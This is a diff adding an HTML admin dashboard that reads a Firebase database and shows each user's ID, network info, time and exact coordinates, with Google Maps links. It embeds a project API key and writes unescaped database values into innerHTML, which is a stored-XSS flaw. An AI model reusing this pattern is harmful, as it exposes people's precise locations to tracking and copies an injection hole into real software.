@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1e293b; margin: 0; padding: 20px; color: white; }
+        
+        .dashboard-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #334155;
+        }
+
+        .live-badge {
+            background: #ef4444; color: white; padding: 5px 12px; border-radius: 20px;
+            font-size: 12px; font-weight: bold; animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        .table-container {
+            background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            overflow-x: auto; /* For mobile scrolling */
+        }
+
+        table { width: 100%; border-collapse: collapse; color: #333; min-width: 600px; }
+        
+        thead { background: #0f172a; color: white; }
+        
+        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #e2e8f0; }
+        
+        tr:hover { background: #f1f5f9; }
+        
+        .empty-state { text-align: center; padding: 40px; color: #64748b; font-style: italic; }
+
+        /* Map Button Style */
+        .map-btn {
+            background-color: #4285F4; /* Google Blue */
+            color: white;
+            text-decoration: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            transition: transform 0.2s;
+        }
+
+        .map-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .net-tag { background: #dcfce7; color: #166534; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="dashboard-header">
+        <h2>👨‍💼 Admin Control Panel</h2>
+        <span class="live-badge">● LIVE</span>
+    </div>
+
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th width="20%">User ID</th>
+                    <th width="30%">Network Info</th>
+                    <th width="30%">Location</th>
+                    <th width="20%">Action</th>
+                </tr>
+            </thead>
+            <tbody id="data-body">
+                <tr><td colspan="4" class="empty-state">Data wait kar rahe hain...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        // --- 1. FIREBASE CONFIG ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyB7atEHWnOo_EzCuFxBRg4xWF51x4atfRQ",
+            authDomain: "wingo-new-pro.firebaseapp.com",
+            databaseURL: "https://wingo-new-pro-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "wingo-new-pro",
+            storageBucket: "wingo-new-pro.firebisestorage.app",
+            messagingSenderId: "574707809146",
+            appId: "1:574707809146:web:fb0d53fc0a202c4d2934c3",
+            measurementId: "G-WED3TVXE62"
+        };
+
+        // Initialize Firebase
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
+
+        // --- 2. FETCH DATA & CREATE GOOGLE MAPS LINK ---
+        const usersRef = db.ref('users');
+
+        usersRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            const tbody = document.getElementById('data-body');
+            tbody.innerHTML = ""; // Clear old data
+
+            if (data) {
+                Object.keys(data).forEach(key => {
+                    const user = data[key];
+                    
+                    // Logic to split Lat/Long or handle raw string
+                    let lat = "", lng = "";
+                    let locDisplay = user.location;
+
+                    // Check if location is "lat, lng" format
+                    if (user.location && user.location.includes(',')) {
+                        const parts = user.location.split(',');
+                        lat = parts[0].trim();
+                        lng = parts[1].trim();
+                        
+                        // Google Maps Link Format: https://www.google.com/maps?q=lat,lng
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                        
+                        // Create Button
+                        locDisplay = `
+                            <div style="font-size:12px; color:#666; margin-bottom:4px;">${user.location}</div>
+                            <a href="${mapUrl}" target="_blank" class="map-btn">
+                                📍 View on Google Maps
+                            </a>
+                        `;
+                    } else {
+                        locDisplay = `<span style="color:#ef4444;">Location Denied</span>`;
+                    }
+
+                    const row = `
+                        <tr>
+                            <td style="font-weight:bold; color:#334155;">${user.uid}</td>
+                            <td><span class="net-tag">${user.network}</span></td>
+                            <td>${locDisplay}</td>
+                            <td style="font-size:12px; color:#888;">${user.time}</td>
+                        </tr>
+                    `;
+                    tbody.innerHTML += row;
+                });
+            } else {
+                tbody.innerHTML = "<tr><td colspan='4' class='empty-state'>Abhi tak koi data nahi hai.</td></tr>";
+            }
+        });
+    </script>
+</body>
+</html>
